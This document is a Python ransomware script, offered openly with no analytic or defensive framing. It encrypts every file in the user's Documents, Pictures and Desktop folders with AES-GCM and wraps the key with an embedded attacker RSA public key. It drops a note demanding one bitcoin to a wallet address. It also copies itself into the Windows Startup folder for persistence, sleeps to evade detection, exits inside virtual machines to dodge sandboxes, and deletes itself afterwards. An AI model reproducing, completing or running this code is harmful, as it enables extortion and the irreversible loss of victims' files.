import os
import time
import sys
import shutil
import subprocess
import platform
import ctypes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.serialization import load_pem_public_key

ATTACKER_PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvH6ROxg...
-----END PUBLIC KEY-----"""

public_key = load_pem_public_key(ATTACKER_PUBLIC_KEY_PEM)

def generate_aes_key():
    return AESGCM.generate_key(bit_length=128)

def encrypt_aes_key(aes_key):
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

def encrypt_file(file_path, aes_key):
    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted = aesgcm.encrypt(nonce, data, None)
        with open(file_path, "wb") as f:
            f.write(nonce + encrypted)
    except Exception:
        pass

def get_targets():
    user_folders = ["Documents", "Pictures", "Desktop"]
    targets = []
    for folder in user_folders:
        path = os.path.expanduser(f"~/{folder}")
        for root, _, files in os.walk(path):
            for file in files:
                if not file.endswith((".exe", ".dll")):
                    targets.append(os.path.join(root, file))
    return targets

def write_ransom_note():
    note = """
Your files have been encrypted!
To recover your files, send 1 BTC to the following wallet:
1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
Contact us at: attacker@tormail.onion
"""
    desktop = os.path.expanduser("~/Desktop")
    try:
        with open(os.path.join(desktop, "README_DECRYPT.txt"), "w") as f:
            f.write(note)
    except:
        pass

def add_persistence():
    if platform.system() == "Windows":
        try:
            startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            script_path = os.path.abspath(sys.argv[0])
            target_path = os.path.join(startup_folder, "winransom.pyw")
            if not os.path.exists(target_path):
                shutil.copyfile(script_path, target_path)
        except Exception:
            pass
    else:
        # For Linux/macOS, add a cron job or launch agent (not implemented here)
        pass

def is_running_in_vm():
    try:
        if platform.system() == "Windows":
            import wmi
            c = wmi.WMI()
            for system in c.Win32_ComputerSystem():
                if "Virtual" in system.Model or "VMware" in system.Manufacturer:
                    return True
        else:
            with open("/sys/class/dmi/id/product_name", "r") as f:
                if "Virtual" in f.read():
                    return True
    except:
        pass
    return False

def cleanup():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
    except:
        pass

def main():
    # Stealth delay
    time.sleep(15)
    
    if is_running_in_vm():
        sys.exit()

    add_persistence()

    aes_key = generate_aes_key()
    encrypted_key = encrypt_aes_key(aes_key)
    
    # Normally, send encrypted_key to attacker here (not shown)

    targets = get_targets()
    for file_path in targets:
        encrypt_file(file_path, aes_key)

    write_ransom_note()
    
    cleanup()

if __name__ == "__main__":
    main()
